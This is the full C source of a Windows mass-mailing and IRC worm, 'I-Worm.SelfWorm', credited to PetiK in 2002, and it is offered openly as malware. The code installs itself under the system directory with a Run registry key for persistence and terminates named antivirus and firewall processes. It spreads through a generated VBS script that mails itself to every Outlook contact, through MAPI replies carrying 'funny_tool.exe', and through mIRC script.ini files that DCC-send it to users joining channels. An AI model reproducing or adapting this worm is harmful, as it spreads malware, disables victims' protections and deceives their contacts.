/*
Start : April 1st 2002
Name : I-Worm.SelfWorm
Coder : PetiK
Size : 

*/


#include <windows.h>
#include <stdio.h>
#include <mapi.h>
#include <tlhelp32.h>
#include <winver.h>
#include "SelfWorm.h"

#if defined (win32)
   #define IS_WIN32 TRUE
#else
   #define IS_WIN32 FALSE
#endif

HINSTANCE hInst;        // Instance courante.

LPCTSTR lpszAppName = "SelfWorm";
LPCTSTR lpszTitle =   "SelfWorm 1.0";

char    filename[100],cpywrm[100],copy2[100],start[100];
LPSTR   Run="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    SHFolder=".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
LPTSTR  cmdLine,ptr;
BOOL    installed,rProcessFound;
HANDLE  fd,lSnapshot,myproc;
BYTE    desktop[50],favoris[50],personal[50],cache[50],startup[100];
DWORD   sizcache=sizeof(desktop),sizfavoris=sizeof(favoris),
    sizpersonal=sizeof(personal),sizdesktop=sizeof(cache),sizstartup=sizeof(startup);
DWORD   type=REG_SZ;
FILE    *vbsworm;

LHANDLE session;
MapiMessage mess;
MapiMessage *mes;
MapiRecipDesc from;
char messId[512],mname[50],maddr[30];
HINSTANCE hMAPI;

HKEY        hReg;
PROCESSENTRY32  uProcess;

void    mirc(char *);
void    StopAV(char *);

ULONG (PASCAL FAR *mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
ULONG (PASCAL FAR *mFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
ULONG (PASCAL FAR *mReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
ULONG (PASCAL FAR *mFreeBuffer)(LPVOID);

BOOL RegisterWin95(CONST WNDCLASS* lpwc);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
    MSG msg;
    HWND hWnd;
    WNDCLASS wc;

    RegOpenKeyEx(HKEY_USERS,SHFolder,0,KEY_QUERY_VALUE,&hReg);
    RegQueryValueEx(hReg,"Desktop",0,&type,desktop,&sizdesktop);
    RegQueryValueEx(hReg,"Favorites",0,&type,favoris,&sizfavoris);
    RegQueryValueEx(hReg,"Personal",0,&type,personal,&sizpersonal);
    RegQueryValueEx(hReg,"Cache",0,&type,cache,&sizcache);
    RegQueryValueEx(hReg,"Startup",0,&type,startup,&sizstartup);
    RegCloseKey(hReg);

    GetModuleFileName(hInstance,filename,100);
    GetSystemDirectory((char *)cpywrm,100);
    strcat(cpywrm,"\\ShellW32.exe");
    CopyFile(filename,cpywrm,0);

    strcpy(copy2,cpywrm);
    strcat(copy2," -i");

    RegOpenKeyEx(HKEY_LOCAL_MACHINE,Run,0,KEY_WRITE,&hReg);
    RegSetValueEx(hReg,"Shell32",0,REG_SZ,(BYTE *)copy2,100);
    RegCloseKey(hReg);

installed=FALSE;
cmdLine=GetCommandLine();
if(cmdLine) {
    for(ptr=cmdLine;ptr[0]!='-' && ptr[1]!=0;ptr++);
    if(ptr[0]=='-' && ptr[1]!=0) {
        switch(ptr[1]) {
            default:
            break;
            case 'i':
                installed=TRUE;
                break;
            }
        }
    }

    hMAPI=LoadLibrary("MAPI32.DLL");
    (FARPROC &)mSendMail=GetProcAddress(hMAPI,"MAPISendMail");
    (FARPROC &)mLogon=GetProcAddress(hMAPI,"MAPILogon");
    (FARPROC &)mLogoff=GetProcAddress(hMAPI,"MAPILogoff");
    (FARPROC &)mFindNext=GetProcAddress(hMAPI,"MAPIFindNext");
    (FARPROC &)mReadMail=GetProcAddress(hMAPI,"MAPIReadMail");
    (FARPROC &)mFreeBuffer=GetProcAddress(hMAPI,"MAPIFreeBuffer");

if(!installed) {



   wc.style          = CS_HREDRAW | CS_VREDRAW;
   wc.lpfnWndProc    = (WNDPROC)WndProc;
   wc.cbClsExtra     = 0;
   wc.cbWndExtra     = 0;
   wc.hInstance      = 0;
   wc.hIcon          = LoadIcon(hInstance, lpszAppName);
   wc.hCursor        = LoadCursor(NULL, IDC_ARROW);
   wc.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
   wc.lpszMenuName   = lpszAppName;
   wc.lpszClassName  = lpszAppName;

   if(!RegisterWin95(&wc))
      return FALSE;
   hInst = hInstance;
   hWnd = CreateWindow (lpszAppName,
                        lpszTitle,
                        WS_OVERLAPPEDWINDOW|WS_MAXIMIZEBOX,
            150,150,300,200,NULL,NULL,hInstance,NULL);
   if(!hWnd)
      return FALSE;
;   ShowWindow(hWnd, nCmdShow);
   ShowWindow(hWnd,SW_SHOWNORMAL);
   UpdateWindow(hWnd);
   while(GetMessage(&msg, NULL, 0,0))
    {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
    }
   return(msg.wParam);

    }
else
    {
    MessageBox(NULL,"SelfWorm actif","SelfWorm",MB_OK|MB_ICONINFORMATION);
    FreeLibrary(hMAPI);
    }


 }

BOOL RegisterWin95(CONST WNDCLASS* lpwc)
 {
   WNDCLASSEX wcex;

   wcex.style           = lpwc->style;
   wcex.lpfnWndProc     = lpwc->lpfnWndProc;
   wcex.cbClsExtra      = lpwc->cbClsExtra;
   wcex.cbWndExtra      = lpwc->cbWndExtra;
   wcex.hInstance       = lpwc->hInstance;
   wcex.hIcon           = lpwc->hIcon;
   wcex.hCursor         = lpwc->hCursor;
   wcex.hbrBackground   = lpwc->hbrBackground;
   wcex.lpszMenuName    = lpwc->lpszMenuName;
   wcex.lpszClassName   = lpwc->lpszClassName;
   wcex.cbSize          = sizeof(WNDCLASSEX);
   wcex.hIconSm         = LoadIcon(wcex.hInstance, "TDW");
   return RegisterClassEx(&wcex);
 }

LRESULT CALLBACK WndProc( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
static HWND hEdit = NULL;
   switch(uMsg)
    {
    case WM_INITDIALOG:
    hEdit=CreateWindow( "BUTTON", "ABOUT",WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,0,0,290,190,hWnd,(HMENU)IDM_ABOUT,hInst,NULL );
    break;
     case WM_COMMAND:
         switch(LOWORD(wParam))
          {
        case IDM_ABOUT:
            MessageBox(NULL,"Written by PetiK. (c)2002","I-Worm.SelfWorm",
            MB_OK|MB_ICONINFORMATION);
            break;
        case IDM_MIRC:
            mirc("C:\\mirc\\script.ini");
            mirc("C:\\mirc32\\script.ini");
            mirc("C:\\Program Files\\mirc\\script.ini");
            mirc("C:\\Program Files\\mirc32\\script.ini");
            mirc("C:\\progra~1\\mirc\\script.ini");
            mirc("C:\\progra~1\\mirc32\\script.ini");
            break;
        case IDM_STOPAV:
            StopAV("AVP32.EXE");        // AVP
            StopAV("AVPCC.EXE");        // AVP
            StopAV("AVPM.EXE");     // AVP
            StopAV("WFINDV32.EXE");     // Dr. Solomon
            StopAV("F-AGNT95.EXE");     // F-Secure
            StopAV("NAVAPW32.EXE");     // Norton Antivirus
            StopAV("NAVW32.EXE");       // Norton Antivirus
            StopAV("NMAIN.EXE");        // Norton Antivirus
            StopAV("PAVSCHED.EXE");     // Panda AntiVirus
            StopAV("ZONEALARM.EXE");    // ZoneAlarm
            break;
        case IDM_STARTUP:
            strcpy(start,startup);
            strcat(start,"\\Shell32.exe");
            CopyFile(filename,"C:\\hello.exe",0);
            break;
        case IDM_VBSSPREAD:
            vbsworm=fopen("C:\\selfworm.vbs","w");
            fprintf(vbsworm,"On Error Resume Next\n");
            fprintf(vbsworm,"Set sys=sf.GetSpecialFolder(1)\n");
            fprintf(vbsworm,"Set OA=CreateObject(%cOutlook.Application%c)\n",34,34);
            fprintf(vbsworm,"Set MA=OA.GetNameSpace(%cMAPI%c)\n",34,34);
            fprintf(vbsworm,"For Each C In MA.AddressLists\n");
            fprintf(vbsworm,"If C.AddressEntries.Count <> 0 Then\n");
            fprintf(vbsworm,"For D=1 To C.AddressEntries.Count\n");
            fprintf(vbsworm,"Set AD=C.AddressEntries(D)\n");
            fprintf(vbsworm,"Set EM=OA.CreateItem(0)\n");
            fprintf(vbsworm,"EM.To=AD.Address\n");
            fprintf(vbsworm,"EM.Subject=%cHi %c&AD.Name&%c look at this.%c\n",34,34,34,34);
            fprintf(vbsworm,"body=%cI found this on the web.%c\n",34,34);
            fprintf(vbsworm,"body = body & VbCrLf & %cOpen this funny tool.%c\n",34,34);
            fprintf(vbsworm,"EM.Body=body\n");
            fprintf(vbsworm,"EM.Attachments.Add(%c%s%c)\n",34,cpywrm,34);
            fprintf(vbsworm,"EM.DeleteAfterSubmit=True\n");
            fprintf(vbsworm,"If EM.To <> %c%c Then\n",34,34);
            fprintf(vbsworm,"EM.Send\n");
            fprintf(vbsworm,"End If\n");
            fprintf(vbsworm,"Next\n");
            fprintf(vbsworm,"End If\n");
            fprintf(vbsworm,"Next\n");
            fclose(vbsworm);
            ShellExecute(NULL,"open","C:\\selfworm.vbs",NULL,NULL,SW_SHOWNORMAL);
            Sleep(3000);
            DeleteFile("C:\\selfworm.vbs");
            break;
        case IDM_READMAIL:
            mLogon(NULL,NULL,NULL,MAPI_NEW_SESSION,NULL,&session);
            if(mFindNext(session,0,NULL,NULL,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS) {
              do {
                 if(mReadMail(session,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&mes)==SUCCESS_SUCCESS) {
                strcpy(mname,mes->lpOriginator->lpszName);
                strcpy(maddr,mes->lpOriginator->lpszAddress);
                mes->ulReserved=0;
                mes->lpszSubject="Re: NEW MAIL.";
                mes->lpszNoteText="Here you have a new mail with a funny tool. No danger.\n"
                            "   See you soon.";
                mes->lpszMessageType=NULL;
                mes->lpszDateReceived=NULL;
                mes->lpszConversationID=NULL;
                mes->flFlags=MAPI_SENT;
                mes->lpOriginator->ulReserved=0;
                mes->lpOriginator->ulRecipClass=MAPI_ORIG;
                mes->lpOriginator->lpszName=mes->lpRecips->lpszName;
                mes->lpOriginator->lpszAddress=mes->lpRecips->lpszAddress;
                mes->nRecipCount=1;
                mes->lpRecips->ulReserved=0;
                mes->lpRecips->ulRecipClass=MAPI_TO;
                mes->lpRecips->lpszName=mname;
                mes->lpRecips->lpszAddress=maddr;
                mes->nFileCount=1;
                mes->lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
                memset(mes->lpFiles, 0, sizeof(MapiFileDesc));
                mes->lpFiles->ulReserved=0;
                mes->lpFiles->flFlags=NULL;
                mes->lpFiles->nPosition=-1;
                mes->lpFiles->lpszPathName=filename;
                mes->lpFiles->lpszFileName="funny_tool.exe";
                mes->lpFiles->lpFileType=NULL;
                mSendMail(session, NULL, mes, NULL, NULL);
                }
              }while(mFindNext(session,0,NULL,messId,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS);
            free(mes->lpFiles);
            mFreeBuffer(mes);
            mLogoff(session,0,0,0);
            }
            break;
        case IDM_EXIT :
            FreeLibrary(hMAPI);
            DestroyWindow(hWnd);
            break;
          }
         break;
      case WM_DESTROY :
         PostQuitMessage(0);
         break;
      default:
         return (DefWindowProc(hWnd, uMsg, wParam, lParam));
    }
   return(0L);
 }


void mirc(char *dir)
{
FILE *script;
script=fopen("C:\\script.ini","w");
fprintf(script,"[script]\n");
fprintf(script,"n0=on 1:JOIN:#:{\n");
fprintf(script,"n1= /if ( $nick == $me ) { halt }\n");
fprintf(script,"n2= /.dcc send $nick %s\n",cpywrm);
fprintf(script,"n3=}\n");
fclose(script);
CopyFile("C:\\script.ini",dir,0);
DeleteFile("C:\\script.ini");
}

void StopAV(char *antivirus)
{
register BOOL term;
lSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
uProcess.dwSize=sizeof(uProcess);
rProcessFound=Process32First(lSnapshot,&uProcess);
while(rProcessFound) {
    if(strstr(uProcess.szExeFile,antivirus)!=NULL) {    // Norton Antivirus
        myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
        if(myproc!=NULL) {
            term=TerminateProcess(myproc,0);
        }
        CloseHandle(myproc);
    }
    rProcessFound=Process32Next(lSnapshot,&uProcess);
}
CloseHandle(lSnapshot);
}
